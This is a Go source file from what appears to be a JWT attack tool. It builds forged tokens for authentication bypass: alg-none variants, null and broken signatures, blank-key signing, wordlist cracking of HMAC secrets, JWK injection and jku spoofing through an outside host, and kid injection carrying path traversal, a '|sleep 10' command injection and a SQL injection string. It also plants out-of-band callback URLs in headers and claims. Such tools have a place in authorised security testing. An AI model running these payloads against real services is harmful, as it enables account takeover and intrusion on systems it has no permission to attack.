package exploits

import (
	"bufio"
	"crypto/md5"
	"encoding/json"
	"strings"

	"fmt"
	"log"
	"os"
	"time"

	"github.com/golang-jwt/jwt"
	"github.com/ram8537/jwt-payloads/helpers"
)

var AllPayloads = make(map[string]string)

func PersistenceCheck(token string, checkNumber int) {
	AllPayloads[fmt.Sprintf("persistence_check_%v", checkNumber)] = token
}

func BrokenSignature(decodedToken *jwt.Token) {
	payload := decodedToken.Raw
	AllPayloads["broken_signature"] = payload[:len(payload)-4]
}

func ReflectedClaims(decodedToken *jwt.Token, parts []string) {
	headerB64 := parts[0]
	signatureB64 := parts[2]
	timeString := time.Now().String()
	data := []byte(timeString)
	hash := md5.Sum(data)		
	checkval := fmt.Sprintf("jwt_inject_%x_", hash)

	claims := decodedToken.Claims.(jwt.MapClaims)
	allModifiedClaims := make([]string, 0)

	for key := range claims {
		modifications := []map[string]interface{}{{key: checkval + key}}
		modifiedB64 := helpers.InjectSegment(claims, modifications)
		allModifiedClaims = append(allModifiedClaims, modifiedB64)
	}

	for i, claimB64 := range allModifiedClaims {
		payloadName := fmt.Sprintf("reflected_claim_%v", i+1)
		AllPayloads[payloadName] = headerB64 + "." + claimB64 + "." + signatureB64
	}
}

func CrackHmac(parts []string) {
	var cracked bool
	signingString := parts[0] + "." + parts[1]
	signature := parts[2]
	file, err := os.Open("exploits/common-jwt-secrets.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		key := []byte(scanner.Text())
		if jwt.SigningMethodHS256.Verify(signingString, signature, key) == nil {
			cracked = true
			fmt.Println("The secret key is:", scanner.Text())
			break
		} else {
			cracked = false
		}
	}

	if !cracked {
		fmt.Println("Secret key not found in wordlist")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func BlankPassword(decodedToken *jwt.Token) {
	key := []byte("")
	modifiedToken, err := decodedToken.SignedString(key)
	if err == nil {
		AllPayloads["blank_password"] = modifiedToken
	}
}

func NullSignature(parts []string) {
	headerB64 := parts[0]
	payloadB64 := parts[1]
	AllPayloads["null_signature"] = headerB64 + "." + payloadB64 + "."
}

func AlgNone(decodedToken *jwt.Token, parts []string) {
	originalHeader := decodedToken.Header
	claimsB64 := parts[1]

	algVariations := []string{"NONE", "NONe", "NOnE", "NOne", "NoNE", "NoNe", "NonE", "None", "nONE", "nONe", "nOnE", "nOne", "noNE", "noNe", "nonE", "none"}
	allModifiedHeaders := helpers.InjectValues(originalHeader, "alg", algVariations)

	// Leaving a trailing dot (no signature)
	for i, headerB64 := range allModifiedHeaders {
		payloadName := fmt.Sprintf("alg_none_%v", i+1)
		AllPayloads[payloadName] = headerB64 + "." + claimsB64 + "."
	}
	// Sign with signature = ""
	payloads := helpers.SignBlankPassword(allModifiedHeaders, claimsB64, "claims")
	for i, modifiedToken := range payloads {
		payloadName := fmt.Sprintf("alg_none_sig_%v", i+1)
		AllPayloads[payloadName] = modifiedToken
	}
}

func JWKSInjection(decodedToken *jwt.Token, parts []string) {
	originalHeader := decodedToken.Header
	modifiedHeader := make(map[string]interface{}, 0)
	modifiedJWKS, _, key := helpers.GenerateJWKS(decodedToken)

	modifiedHeader["jwk"] = modifiedJWKS
	modifiedHeader["alg"] = "RS256"

	modifications := []map[string]interface{}{{"jwk": modifiedJWKS}, {"alg": "RS256"}}
	headerB64 := helpers.InjectSegment(originalHeader, modifications)

	claimsB64 := parts[1]
	signingString := headerB64 + "." + claimsB64

	signature, err := jwt.SigningMethodRS256.Sign(signingString, key)
	if err != nil {
		log.Fatal(err)
	}

	AllPayloads["jwk_injection"] = headerB64 + "." + claimsB64 + "." + signature
}

func SpoofJWKS(decodedToken *jwt.Token, parts []string) {
	originalHeader := decodedToken.Header
	modifiedJWKS, _, key := helpers.GenerateJWKS(decodedToken)
	jwks := make(map[string][]interface{})

	jwks["keys"] = append(jwks["keys"], modifiedJWKS)

	jwksJSON, err := json.Marshal(jwks)
	if err != nil {
		log.Println(err)
	}
	jwksB64 := jwt.EncodeSegment(jwksJSON)

	jku := "https://httpbin.org/base64/" + jwksB64

	modifiedHeader := make(map[string]interface{}, 0)
	for k, v := range originalHeader {
		if !strings.Contains(originalHeader["alg"].(string), "HS") {
			modifiedHeader[k] = v
		}
	}
	modifiedHeader["jku"] = jku
	modifiedHeader["alg"] = "RS256"

	headerJSON, err := json.Marshal(modifiedHeader)
	if err != nil {
		log.Println(err)
	}

	headerB64 := jwt.EncodeSegment(headerJSON)
	claimsB64 := parts[1]
	signingString := headerB64 + "." + claimsB64
	signature, err := jwt.SigningMethodRS256.Sign(signingString, key)

	if err != nil {
		log.Println(err)
	}
	AllPayloads["jwks_spoofing"] = headerB64 + "." + claimsB64 + "." + signature
}

func KidInjectionPathTraversal(decodedToken *jwt.Token, parts []string) {
	claimsB64 := parts[1]
	originalHeader := decodedToken.Header

	dotsToLoop := "../"
	pathTraversalList := make([]string, 0)

	for i := 1; i <= 7; i++ {
		a := strings.Repeat(dotsToLoop, i) + "dev/null"
		pathTraversalList = append(pathTraversalList, a)
	}

	allModifiedHeaders := helpers.InjectValues(originalHeader, "kid", pathTraversalList)
	payloads := helpers.SignBlankPassword(allModifiedHeaders, claimsB64, "claims")

	for i, modifiedToken := range payloads {
		payloadName := fmt.Sprintf("kid_injection_path_traversal_%v", i+1)
		AllPayloads[payloadName] = modifiedToken
	}

}

func KidInjection(decodedToken *jwt.Token, parts []string) {
	originalHeader := decodedToken.Header
	claimsB64 := parts[1]

	//RCE , blank kid, SQLi
	kidVariations := []string{"|sleep 10", "", `"x' UNION SELECT '1';--"`}
	allModifiedHeaders := helpers.InjectValues(originalHeader, "kid", kidVariations)
	payloads := helpers.SignBlankPassword(allModifiedHeaders, claimsB64, "claims")

	for i, modifiedToken := range payloads {
		payloadName := fmt.Sprintf("kid_injection_%v", i+1)
		AllPayloads[payloadName] = modifiedToken
	}
}

func CommonClaims(decodedToken *jwt.Token, parts []string, outOfBandURL string) {

	originalHeader := decodedToken.Header
	originalClaims := decodedToken.Claims.(jwt.MapClaims)
	originalHeaderB64 := parts[0]
	claimsB64 := parts[1]
	signatureB64 := parts[2]

	commonHeaders := []string{"typ", "jku", "kid", "x5u", "x5t", "cty"}
	commonPayloads := []string{"iss", "sub", "aud", "exp", "nbf", "iat", "jti", "name", "given_name", "family_name", "middle_name", "nickname", "preferred_username", "profile", "picture", "website", "email", "email_verified", "gender", "birthdate", "zoneinfo", "locale", "phone_number", "phone_number_verified", "address", "updated_at", "azp", "nonce", "auth_time", "at_hash", "c_hash", "acr", "amr", "sub_jwk", "cnf", "sip_from_tag", "sip_date", "sip_callid", "sip_cseq_num", "sip_via_branch", "orig", "dest", "mky", "events", "toe", "txn", "rph", "sid", "vot", "vtm", "attest", "origid", "act", "scope", "client_id", "may_act", "jcard", "at_use_nbr", "div", "opt"}
	dangerousContents := []interface{}{nil, true, false, "jwt", 0}

	targetURLHeader := outOfBandURL + "/inject_common_header"
	targetURLPayload := outOfBandURL + "/inject_common_payload"
	allModifiedHeaders := make([]string, 0)
	allModifiedClaims := make([]string, 0)

	// header modifications -> out of band interaction

	for _, key := range commonHeaders {
		modifications := []map[string]interface{}{{key: targetURLHeader}}
		modifiedHeaderB64 := helpers.InjectSegment(originalHeader, modifications)
		allModifiedHeaders = append(allModifiedHeaders, modifiedHeaderB64)
	}

	// header modifications -> dangerous content types
	for _, key := range commonHeaders {
		for _, content := range dangerousContents {
			modifications := []map[string]interface{}{{key: content}}
			modifiedHeaderB64 := helpers.InjectSegment(originalHeader, modifications)
			allModifiedHeaders = append(allModifiedHeaders, modifiedHeaderB64)
		}
	}

	// headers - save to list (keep original signature)
	for i, headerB64 := range allModifiedHeaders {
		payloadName := fmt.Sprintf("common_claims_header_%v", i+1)
		AllPayloads[payloadName] = headerB64 + "." + claimsB64 + "." + signatureB64
	}

	// claim modifications --> out of band interaction
	for _, key := range commonPayloads {
		modifications := []map[string]interface{}{{key: targetURLPayload}}
		modifiedPayloadB64 := helpers.InjectSegment(originalClaims, modifications)
		allModifiedClaims = append(allModifiedClaims, modifiedPayloadB64)
	}

	// claim modifications -> dangerous content types
	for _, key := range commonPayloads {
		for _, content := range dangerousContents {
			modifications := []map[string]interface{}{{key: content}}
			modifiedPayloadB64 := helpers.InjectSegment(originalClaims, modifications)
			allModifiedClaims = append(allModifiedClaims, modifiedPayloadB64)
		}
	}

	// claims - save to list(keep original signature)
	for i, modifiedClaimB64 := range allModifiedClaims {
		payloadName := fmt.Sprintf("common_claims_payload_%v", i+1)
		AllPayloads[payloadName] = originalHeaderB64 + "." + modifiedClaimB64 + "." + signatureB64
	}
}

func ExternalInteractions(decodedToken *jwt.Token, parts []string, outOfBandURL string) {
	headB64 := parts[0]
	claimsB64 := parts[1]
	signatureB64 := parts[2]

	claims := decodedToken.Claims.(jwt.MapClaims)
	originalHeader := decodedToken.Header
	headerModifications := make([]map[string]interface{}, 0)
	claimModifications := make([]map[string]interface{}, 0)

	for key := range claims {
		newClaim := map[string]interface{}{key: outOfBandURL}
		claimModifications = append(claimModifications, newClaim)
	}
	modifiedClaimB64 := helpers.InjectSegment(claims, claimModifications)
	AllPayloads["external_interactions_claims"] = headB64 + "." + modifiedClaimB64 + "." + signatureB64

	for key := range originalHeader {
		newHeader := map[string]interface{}{key: outOfBandURL}
		headerModifications = append(headerModifications, newHeader)
	}
	modifiedHeaderB64 := helpers.InjectSegment(originalHeader, headerModifications)
	AllPayloads["external_interactions_headers"] = modifiedHeaderB64 + "." + claimsB64 + "." + signatureB64
}

func ForcedErrors(decodedToken *jwt.Token, parts []string) {
	originalHeader := decodedToken.Header
	originalClaims := decodedToken.Claims.(jwt.MapClaims)
	headerB64 := parts[0]
	claimsB64 := parts[1]
	signatureB64 := parts[2]

	allModifiedHeaders := make([]string, 0)
	allModifiedClaims := make([]string, 0)

	dangerousContents := []interface{}{nil, true, false, "jwt", 0}

	for _, content := range dangerousContents {
		for key := range originalHeader {
			modifications := []map[string]interface{}{{key: content}}
			modifiedHeaderB64 := helpers.InjectSegment(originalHeader, modifications)
			allModifiedHeaders = append(allModifiedHeaders, modifiedHeaderB64)
		}
	}

	for i, headerB64 := range allModifiedHeaders {
		payloadName := fmt.Sprintf("forced_errors_header_%v", i+1)
		AllPayloads[payloadName] = headerB64 + "." + claimsB64 + "." + signatureB64
	}

	for _, content := range dangerousContents {
		for key := range originalClaims {
			modifications := []map[string]interface{}{{key: content}}
			modifiedPayloadB64 := helpers.InjectSegment(originalClaims, modifications)
			allModifiedClaims = append(allModifiedClaims, modifiedPayloadB64)
		}
	}

	for i, modifiedClaimsB64 := range allModifiedClaims {
		payloadName := fmt.Sprintf("forced_errors_payload_%v", i+1)
		AllPayloads[payloadName] = headerB64 + "." + modifiedClaimsB64 + "." + signatureB64
	}
}
